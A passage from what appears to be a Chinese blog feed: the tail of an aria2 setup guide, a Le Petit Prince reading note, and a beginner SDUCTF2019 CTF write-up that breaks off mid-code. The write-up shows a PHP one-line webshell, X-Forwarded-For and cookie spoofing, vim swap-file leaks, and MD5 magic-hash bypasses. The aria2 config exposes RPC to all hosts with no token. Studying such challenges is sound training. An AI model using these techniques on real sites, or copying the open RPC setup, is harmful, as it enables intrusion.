class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># '#'开头为注释内容, 选项都有相应的注释说明, 根据需要修改 ##</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 被注释的选项填写的是默认值, 建议在需要修改时再取消注释  ##</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 文件保存相关 ##</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 文件的保存路径(可使用绝对路径或相对路径), 默认: 当前启动位置</span></span><br><span class="line">dir=aira2/downloads</span><br><span class="line"><span class="meta">#</span><span class="bash"> 启用磁盘缓存, 0为禁用缓存, 需1.16以上版本, 默认:16M</span></span><br><span class="line"><span class="meta">#</span><span class="bash">disk-cache=32M</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 文件预分配方式, 能有效降低磁盘碎片, 默认:prealloc</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 预分配所需时间: none &lt; falloc ? trunc &lt; prealloc</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> falloc和trunc则需要文件系统和内核支持</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> NTFS建议使用falloc, EXT3/4建议trunc, MAC 下需要注释此项</span></span><br><span class="line"><span class="meta">#</span><span class="bash">file-allocation=none</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 断点续传</span></span><br><span class="line">continue=true</span><br><span class="line"></span><br><span class="line">log=aria2/aria2.log</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 下载连接相关 ##</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 最大同时下载任务数, 运行时可修改, 默认:5</span></span><br><span class="line"><span class="meta">#</span><span class="bash">max-concurrent-downloads=5</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 同一服务器连接数, 添加时可指定, 默认:1</span></span><br><span class="line">max-connection-per-server=5</span><br><span class="line"><span class="meta">#</span><span class="bash"> 最小文件分片大小, 添加时可指定, 取值范围1M -1024M, 默认:20M</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 假定size=10M, 文件为20MiB 则使用两个来源下载; 文件为15MiB 则使用一个来源下载</span></span><br><span class="line">min-split-size=10M</span><br><span class="line"><span class="meta">#</span><span class="bash"> 单个任务最大线程数, 添加时可指定, 默认:5</span></span><br><span class="line"><span class="meta">#</span><span class="bash">split=5</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 整体下载速度限制, 运行时可修改, 默认:0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">max-overall-download-limit=0</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 单个任务下载速度限制, 默认:0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">max-download-limit=0</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 整体上传速度限制, 运行时可修改, 默认:0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">max-overall-upload-limit=0</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 单个任务上传速度限制, 默认:0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">max-upload-limit=0</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 禁用IPv6, 默认:<span class="literal">false</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">disable</span>-ipv6=<span class="literal">true</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 连接超时时间, 默认:60</span></span><br><span class="line"><span class="meta">#</span><span class="bash">timeout=60</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 最大重试次数, 设置为0表示不限制重试次数, 默认:5</span></span><br><span class="line"><span class="meta">#</span><span class="bash">max-tries=5</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置重试等待的秒数, 默认:0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">retry-wait=0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 进度保存相关 ##</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 从会话文件中读取下载任务</span></span><br><span class="line">input-file=aria2/aria2.session</span><br><span class="line"><span class="meta">#</span><span class="bash"> 在Aria2退出时保存`错误/未完成`的下载任务到会话文件</span></span><br><span class="line">save-session=aria2/aria2.session</span><br><span class="line"><span class="meta">#</span><span class="bash"> 定时保存会话, 0为退出时才保存, 需1.16.1以上版本, 默认:0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">save-session-interval=60</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># RPC相关设置 ##</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启用RPC, 默认:<span class="literal">false</span></span></span><br><span class="line">enable-rpc=true</span><br><span class="line"><span class="meta">#</span><span class="bash"> 允许所有来源, 默认:<span class="literal">false</span></span></span><br><span class="line">rpc-allow-origin-all=true</span><br><span class="line"><span class="meta">#</span><span class="bash"> 允许非外部访问, 默认:<span class="literal">false</span></span></span><br><span class="line">rpc-listen-all=true</span><br><span class="line"><span class="meta">#</span><span class="bash"> 事件轮询方式, 取值:[epoll, kqueue, port, poll, select], 不同系统默认值不同</span></span><br><span class="line"><span class="meta">#</span><span class="bash">event-poll=select</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> RPC监听端口, 端口被占用时可以修改, 默认:6800</span></span><br><span class="line"><span class="meta">#</span><span class="bash">rpc-listen-port=6800</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置的RPC授权令牌, v1.18.4新增功能, 取代 --rpc-user 和 --rpc-passwd 选项</span></span><br><span class="line"><span class="meta">#</span><span class="bash">rpc-secret=&lt;TOKEN&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置的RPC访问用户名, 此选项新版已废弃, 建议改用 --rpc-secret 选项</span></span><br><span class="line"><span class="meta">#</span><span class="bash">rpc-user=&lt;USER&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置的RPC访问密码, 此选项新版已废弃, 建议改用 --rpc-secret 选项</span></span><br><span class="line"><span class="meta">#</span><span class="bash">rpc-passwd=&lt;PASSWD&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 是否启用 RPC 服务的 SSL/TLS 加密,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启用加密后 RPC 服务需要使用 https 或者 wss 协议连接</span></span><br><span class="line"><span class="meta">#</span><span class="bash">rpc-secure=<span class="literal">true</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在 RPC 服务中启用 SSL/TLS 加密时的证书文件,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用 PEM 格式时，您必须通过 --rpc-private-key 指定私钥</span></span><br><span class="line"><span class="meta">#</span><span class="bash">rpc-certificate=/path/to/certificate.pem</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在 RPC 服务中启用 SSL/TLS 加密时的私钥文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash">rpc-private-key=/path/to/certificate.key</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># BT/PT下载相关 ##</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 当下载的是一个种子(以.torrent结尾)时, 自动开始BT任务, 默认:<span class="literal">true</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">follow-torrent=<span class="literal">true</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> BT监听端口, 当端口被屏蔽时使用, 默认:6881-6999</span></span><br><span class="line">listen-port=51413</span><br><span class="line"><span class="meta">#</span><span class="bash"> 单个种子最大连接数, 默认:55</span></span><br><span class="line"><span class="meta">#</span><span class="bash">bt-max-peers=55</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 打开DHT功能, PT需要禁用, 默认:<span class="literal">true</span></span></span><br><span class="line">enable-dht=false</span><br><span class="line"><span class="meta">#</span><span class="bash"> 打开IPv6 DHT功能, PT需要禁用</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">enable</span>-dht6=<span class="literal">false</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> DHT网络监听端口, 默认:6881-6999</span></span><br><span class="line"><span class="meta">#</span><span class="bash">dht-listen-port=6881-6999</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 本地节点查找, PT需要禁用, 默认:<span class="literal">false</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">bt-enable-lpd=<span class="literal">false</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 种子交换, PT需要禁用, 默认:<span class="literal">true</span></span></span><br><span class="line">enable-peer-exchange=false</span><br><span class="line"><span class="meta">#</span><span class="bash"> 每个种子限速, 对少种的PT很有用, 默认:50K</span></span><br><span class="line"><span class="meta">#</span><span class="bash">bt-request-peer-speed-limit=50K</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 客户端伪装, PT需要</span></span><br><span class="line">peer-id-prefix=-TR2770-</span><br><span class="line">user-agent=Transmission/2.77</span><br><span class="line">peer-agent=Transmission/2.77</span><br><span class="line"><span class="meta">#</span><span class="bash"> 当种子的分享率达到这个数时, 自动停止做种, 0为一直做种, 默认:1.0</span></span><br><span class="line">seed-ratio=0</span><br><span class="line"><span class="meta">#</span><span class="bash"> 强制保存会话, 即使任务已经完成, 默认:<span class="literal">false</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 较新的版本开启后会在任务完成后依然保留.aria2文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash">force-save=<span class="literal">false</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> BT校验相关, 默认:<span class="literal">true</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">bt-hash-check-seed=<span class="literal">true</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 继续之前的BT任务时, 无需再次校验, 默认:<span class="literal">false</span></span></span><br><span class="line">bt-seed-unverified=true</span><br><span class="line"><span class="meta">#</span><span class="bash"> 保存磁力链接元数据为种子文件(.torrent文件), 默认:<span class="literal">false</span></span></span><br><span class="line">bt-save-metadata=true</span><br></pre></td></tr></table></figure><p><strong>注意修改以下选项：</strong></p><p>dir=\path\to\Download\ （下载文件保存路径，改为你想要的）</p><p>log=\path\to\Aria2\Aria2.log （日志文件，路径D:\App\Aria2\改为你安装aria2的路径）</p><p>input-file=\path\to\Aria2\aria2.session</p><p>save-session=\path\to\Aria2\aria2.session</p><p>以下是可以自动隐藏运行aria2的脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateObject(&quot;WScript.Shell&quot;).Run &quot;D:\App\Aria2\aria2c.exe --conf-path=aria2.conf&quot;,0</span><br></pre></td></tr></table></figure><p><strong>3</strong>. 管理Aria 2 下载任务</p><ul><li>首先我们要打开Aria2 的WebUI，即YAWW或者AriaNg</li><li>然后再页面的设置中将JSON-RPC Path设置为<a href="http://localhost:6800/jsonrpc" target="_blank" rel="noopener">http://localhost:6800/jsonrpc</a></li><li>点保存，即可。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Le Petit Prince Note</title>
      <link href="/2019/11/26/Le-Petit-Prince-Note/"/>
      <url>/2019/11/26/Le-Petit-Prince-Note/</url>
      
        <content type="html"><![CDATA[<h1 id="Le-Petit-Prince"><a href="#Le-Petit-Prince" class="headerlink" title="Le Petit Prince"></a>Le Petit Prince</h1><p>小王子</p><p>希望我能如小王子一样，被一朵玫瑰所驯化~</p><p>希望我下次再读这本书时会有不一样的感受把。</p><hr><ul><li><p>我告诉你这么多有关B612号小行星的事情，让你知道它的编号，是因为大人。大人热爱数字。……</p></li><li><p>如果有人爱上一朵花，天上的星星有亿万颗，而这朵花只长在其中一颗上，这足以让他再仰望夜空时感到很快乐。他会告诉自己：“在星空的某处有我的花。”</p></li><li><p>可惜从前我什么都不懂！我应该看着她的行动，而不是听她的言语！她为我散发芬芳，点亮我的生活。我不应该离开她的，我应该看出藏在她那些后面的柔情。花儿的心事好难捉摸的！当时我太小了，不懂得爱是什么。</p></li><li><p>“那你可以审判自己，”国王回答说，“这是最难的。审判自己比审判别人难得多。如果你能正确地审判自己，那你就是真正的聪明人”、</p></li><li><p>看东西只有用心才能看得清楚，重要的东西用眼睛看不见的。</p></li><li><p>正是你为你的玫瑰付出的时间，使得你的玫瑰是如此的重要。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Reading </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SDUCTF2019-wp</title>
      <link href="/2019/11/15/SDUCTF2019-wp/"/>
      <url>/2019/11/15/SDUCTF2019-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="SDUCTF2019-WriteUp"><a href="#SDUCTF2019-WriteUp" class="headerlink" title="SDUCTF2019-WriteUp"></a><center>SDUCTF2019-WriteUp</center></h1><p>刚入门了ctf2周，便有新生赛玩，真好。</p><p>PS.刚准备写wp又放出来一题QAQ</p><p>！！！写wp一半又放出题目</p><p>说好的周六早上放题的，结果早上起来一脸懵逼</p><p>校园网下pwntools下到崩溃啊啊啊啊啊</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a><center>Web</center></h2><h3 id="0x01-最简答的Web题"><a href="#0x01-最简答的Web题" class="headerlink" title="0x01 最简答的Web题"></a>0x01 最简答的Web题</h3><blockquote><p> 题目描述：flag就在html里面，右键点击查看源代码即可查看 </p></blockquote><p>直接F12查看源码，找到flag</p><p><img src="/2019/11/15/SDUCTF2019-wp/web1.jpg" alt></p><h3 id="0x02-按钮点击"><a href="#0x02-按钮点击" class="headerlink" title="0x02 按钮点击"></a>0x02 按钮点击</h3><blockquote><p>题目描述： 想方设法点击按钮 </p></blockquote><p>进入页面一个灰色的按钮，F12查看源码</p><p><img src="/2019/11/15/SDUCTF2019-wp/web2-1.jpg" alt></p><p>删除button标签里的disabled即可点击按钮</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">"width: 150px; height: 60px; font-size: 30px;"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"c()"</span> <span class="attr">value</span>=<span class="string">"flag"</span> <span class="attr">disabled</span>=<span class="string">""</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/11/15/SDUCTF2019-wp/web2-3.jpg" alt></p><p>后面好奇，发现flag就在click2.js里，被base64加密过</p><p><img src="/2019/11/15/SDUCTF2019-wp/web2-2.jpg" alt></p><h3 id="0x03-量子波动速读"><a href="#0x03-量子波动速读" class="headerlink" title="0x03 量子波动速读"></a>0x03 量子波动速读</h3><blockquote><p>题目描述： 你会量子波动速读吗？ </p></blockquote><p>进入页面就一个按钮，点击查看，发现一闪而过的fakeflag</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"window.location.href = 'flag_is_here.html'"</span>&gt;</span></span><br><span class="line">    点击查看flag</span><br><span class="line"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>源码如上，输入<code>url/flag_is_here.html</code>发现就是刚才一闪而过的页面</p><p>利用burpsuite抓包即可，因为所有请求被burpsuite拦截，所以可以看到<code>/flag_is_here.html</code>但是页面上给的是fake ctf，明显不是flag，查看源码得到flag，我是直接用repeater发一个包获得Response。</p><p><img src="/2019/11/15/SDUCTF2019-wp/web3.jpg" alt></p><h3 id="0x04-芝麻开门"><a href="#0x04-芝麻开门" class="headerlink" title="0x04 芝麻开门"></a>0x04 芝麻开门</h3><blockquote><p>题目描述： 简单的提交，芝麻开门 </p></blockquote><p><img src="/2019/11/15/SDUCTF2019-wp/web4.jpg" style="zoom:50%;"></p><p>直接复制题目的zhimakaimen进去，返回的是口令错误</p><p><img src="/2019/11/15/SDUCTF2019-wp/web4-1.jpg" alt></p><p>查看burpsuite拦截的包，好像是因为他的输入框有长度限制，所以少了一个字母</p><p><img src="/2019/11/15/SDUCTF2019-wp/web4-2.jpg" alt></p><p>利用burpsuite的repeater重新发一个完整的包，得到flag</p><h3 id="0x05-Funny-Button"><a href="#0x05-Funny-Button" class="headerlink" title="0x05 Funny Button"></a>0x05 Funny Button</h3><blockquote><p>题目描述： 有趣的按钮，你能点到吗？ </p></blockquote><p>即示例的题目，删除html的css或js都可以，甚至可以用tab键选中button按钮，点击去就是flag</p><h3 id="0x06-曲奇"><a href="#0x06-曲奇" class="headerlink" title="0x06 曲奇"></a>0x06 曲奇</h3><blockquote><p>题目描述： 你喜欢吃曲奇饼干吗？ </p></blockquote><p>曲奇==cookies，直接查看网站cookies即可</p><p><img src="/2019/11/15/SDUCTF2019-wp/web6.jpg" alt></p><p>flag即在内容里，注意flag要进行url解码</p><h3 id="0x07-GET"><a href="#0x07-GET" class="headerlink" title="0x07 GET"></a>0x07 GET</h3><blockquote><p>题目描述： 你就是个没有感情的浏览器 </p></blockquote><p><img src="/2019/11/15/SDUCTF2019-wp/web7.jpg" alt></p><p><img src="/2019/11/15/SDUCTF2019-wp/web7-2.jpg" alt></p><p>我是一个莫得感情的get机器</p><h3 id="0x08-未来浏览器"><a href="#0x08-未来浏览器" class="headerlink" title="0x08 未来浏览器"></a>0x08 未来浏览器</h3><blockquote><p>题目描述：  小王正在追剧《亲爱的，热爱的》，电脑屏幕。。。。（谁帮我编个） 当他再次醒来。。。。。。。 </p></blockquote><p><img src="/2019/11/15/SDUCTF2019-wp/web8.jpg" alt></p><p>有题目已知，用burpsuite改http头属性<code>User-Agent</code>即可</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/6666.6.6666.66 Safari/537.36</span><br></pre></td></tr></table></figure><p>改后发包得到flag</p><h3 id="0x09-POST"><a href="#0x09-POST" class="headerlink" title="0x09 POST"></a>0x09 POST</h3><blockquote><p>题目描述：  你就是一个没有感情的浏览器 </p></blockquote><p><img src="/2019/11/15/SDUCTF2019-wp/web9.jpg" alt></p><p><img src="/2019/11/15/SDUCTF2019-wp/web9-2.jpg" style="zoom:50%;"></p><p>我只是一个莫得感情的post机器</p><p>利用firefox插件HackBar发送post请求，或者用burpsuite也行</p><h3 id="0x0a-vim好用啊"><a href="#0x0a-vim好用啊" class="headerlink" title="0x0a vim好用啊"></a>0x0a vim好用啊</h3><blockquote><p>题目描述：  小明同学用vim编辑主页的时候，实验室断电了！ </p></blockquote><p><img src="/2019/11/15/SDUCTF2019-wp/web10.jpg" alt></p><p>由题目得知用vim时断电，用过vim的人都知道，当vim非正常退出时会创建一个保护的缓存文件，现在word也一样。</p><p>直接百度搜vim异常退出的备份文件，因为上次做过类似的，试试<code>index.php.bak</code>和<code>index.php~</code>没用，就百度了一下，得知备份文件格式为<code>.index.php.swp</code>，访问<code>url/.index.php.swp</code>下载文件得到<code>.index.php.swp</code></p><p><img src="/2019/11/15/SDUCTF2019-wp/web10-2.jpg" alt></p><p>得知flag在<code>url/vimvimvimvim.php</code>里，果然vim是最好的编辑器（狗头保命</p><h3 id="0x0b-一句话木马"><a href="#0x0b-一句话木马" class="headerlink" title="0x0b 一句话木马"></a>0x0b 一句话木马</h3><blockquote><p>题目描述： 听说过<strong>一句话木马</strong>吗？<br>                    听说过<strong>中国菜刀</strong>吗？<br>                    听说过<strong>中国蚁剑</strong>吗？<br>                    快去了解一下吧！！</p></blockquote><p><img src="/2019/11/15/SDUCTF2019-wp/web11.jpg" alt></p><p>看刀<code>&lt;!--php eval(@$_POST[&quot;cmd&quot;]);--&gt;</code>就可知是一句话木马，对这个稍微了解一下，去github获取中国蚁剑即可</p><p>不过有一个坑，就是他默认访问是<code>index.php</code>，但是通过中国蚁剑连不上，回头看页面，发现在题目中有一个<code>shell.php</code>，于是尝试<code>url/shell.php</code>加上密码<code>cmd</code>，成功连上得到flag</p><p><img src="/2019/11/15/SDUCTF2019-wp/web11-2.jpg" alt></p><h3 id="0x0c-达拉崩吧"><a href="#0x0c-达拉崩吧" class="headerlink" title="0x0c 达拉崩吧"></a>0x0c 达拉崩吧</h3><blockquote><p>题目描述：  达拉崩吧打怪小游戏 </p></blockquote><p><img src="/2019/11/15/SDUCTF2019-wp/web12.jpg" alt></p><p>进入页面是个小游戏，发现是hackergame2019原题嘤嘤嘤</p><p>原题wp： <a href="https://github.com/ustclug/hackergame2019-writeups/blob/master/official/达拉崩吧大冒险/README.md" target="_blank" rel="noopener">https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E8%BE%BE%E6%8B%89%E5%B4%A9%E5%90%A7%E5%A4%A7%E5%86%92%E9%99%A9/README.md</a> </p><p>在买菜这里，有一个大整数溢出，<del>后续会搞懂这个原理</del></p><p>原理如下： <a href="https://blog.csdn.net/zhenghhgz/article/details/78657917" target="_blank" rel="noopener">https://blog.csdn.net/zhenghhgz/article/details/78657917</a> </p><blockquote><p>原意是javascript的所有数字，无论整数还是小数，类型都为Number，为64位浮点数。因此，JavaScript中所有的数都是浮点数。遵循IEEE 754标准（浮点数算术标准），JavaScript所能表示的数值范围为正负1.7976931348623157乘以10的308次方，其最小所能表示的小数为正负5乘以10的负324次方，这两个边界值可以分别通过访问Number对象的MAX_VALUE属性和MIN_VALUE属性来获取。</p><p>JavaScript能表示并进行精确算术运算的整数范围为：正负2的53次方，也即从最小值-9007199254740992到最大值+9007199254740992之间的范围；对于超过这个范围的整数，JavaScript依旧可以进行运算，但却不保证运算结果的精度。值得注意的是，对于整数的位运算（比如移位等操作），JavaScript仅支持32位整型数，也即从-2147483648到+2147483647之间的整数。</p></blockquote><p><img src="/2019/11/15/SDUCTF2019-wp/web12-2.jpg" alt></p><p><img src="/2019/11/15/SDUCTF2019-wp/web12-3.jpg" style="zoom:50%;"></p><p>然后得到flag</p><p><img src="/2019/11/15/SDUCTF2019-wp/web12-4.jpg" alt></p><h3 id="0x0d-HTTP头"><a href="#0x0d-HTTP头" class="headerlink" title="0x0d HTTP头"></a>0x0d HTTP头</h3><blockquote><p>题目描述： 你了解http头吗？ </p></blockquote><p><img src="/2019/11/15/SDUCTF2019-wp/web13.jpg" alt></p><p>根据题目，直接查看http Response Headers</p><p>得到flag：<code>F1ag: flag{096b5778-cf23-4f03-8c45-2505b7670b89}</code></p><h3 id="0x0e-robots"><a href="#0x0e-robots" class="headerlink" title="0x0e robots"></a>0x0e robots</h3><blockquote><p>题目描述： 你听说过robots协议吗？<br>他可是每个机器人都需要遵守的协议啊！（笑话） </p></blockquote><p>由题目知，robots是一个限制爬虫的东西，直接访问<code>url/robots.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Disallow: f1ag_1s_h3re.php</span><br></pre></td></tr></table></figure><p>得到如上页面，访问<code>url/f1ag_1s_h3re.php</code>，得到flag</p><h3 id="0x0f-你的IP不太对"><a href="#0x0f-你的IP不太对" class="headerlink" title="0x0f 你的IP不太对"></a>0x0f 你的IP不太对</h3><blockquote><p>题目描述：小伙计，你的IP不太对啊<br>这个网站可不是任何ip都能访问的</p></blockquote><p>由题目可知，需要改ip成<code>111.111.111.111</code>访问，易知是XFF伪造</p><p>利用burpsuite抓包，在header里加上<code>X-Forwarded-For:111.111.111.111</code>即可，发送包，得到flag</p><h3 id="0x10-登录"><a href="#0x10-登录" class="headerlink" title="0x10 登录"></a>0x10 登录</h3><blockquote><p>题目描述： 小王做了一个网站需要登录，但是验证貌似有点漏洞 </p></blockquote><p>进入页面之后发现button是没有用的，F5刷新之后抓包，发现有一个cookie</p><p><img src="/2019/11/15/SDUCTF2019-wp/web17-1.jpg" alt></p><p>尝试将Cookie改成<code>Cookie: Login=1</code>，发现成功得到flag在button上</p><p><img src="/2019/11/15/SDUCTF2019-wp/web17-2.jpg" alt></p><h3 id="0x11-破解md5"><a href="#0x11-破解md5" class="headerlink" title="0x11 破解md5"></a>0x11 破解md5</h3><blockquote><p>题目描述： md5是坚不可破的，是真的吗？ </p></blockquote><p><img src="/2019/11/15/SDUCTF2019-wp/web18-1.jpg" alt></p><p>进入页面之后直接查看源码，如题直接百度搜索php MD5漏洞。</p><blockquote><p>引自： <a href="https://blog.csdn.net/qq_19980431/article/details/83018232" target="_blank" rel="noopener">https://blog.csdn.net/qq_19980431/article/details/83018232</a> </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'b'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'a'</span>] != $_GET[<span class="string">'b'</span>])</span><br><span class="line">    <span class="keyword">if</span> (md5($_GET[<span class="string">'a'</span>]) == md5($_GET[<span class="string">'b'</span>]))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>若要求满足上述条件则<br>那么要求name和password数值不同但是MD5相同，在这里可以利用绕过。<br>PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。 </p><blockquote><p><strong>以下值在md5加密后以0E开头：</strong></p><ul><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li><li>s214587387a</li><li>s214587387a</li></ul><p><strong>以下值在sha1加密后以0E开头：</strong></p><ul><li>sha1(‘aaroZmOk’)</li><li>sha1(‘aaK1STfY’)</li><li>sha1(‘aaO8zKZF’)</li><li>sha1(‘aa3OFF9m’)</li></ul></blockquote><p>直接传入<code>url/?a=QNKCDZO&amp;b=240610708</code>，得到flag</p><h3 id="0x12-php是最好的语言"><a href="#0x12-php是最好的语言" class="headerlink" title="0x12 php是最好的语言"></a>0x12 php是最好的语言</h3><blockquote><p>题目描述： php是最好的语言? </p></blockquote><p><img src="/2019/11/15/SDUCTF2019-wp/web19.jpg" alt></p><p>进入页面如上图，点击查看source.php</p><p><img src="/2019/11/15/SDUCTF2019-wp/web19-2.jpg" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">    $flag=<span class="string">"flag&#123;this_is_flag&#125;"</span>;</span><br><span class="line">    $pass=<span class="string">""</span>;</span><br><span class="line">    $thepassword_123=<span class="string">"不告诉你"</span>;</span><br><span class="line">    extract($_POST);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">    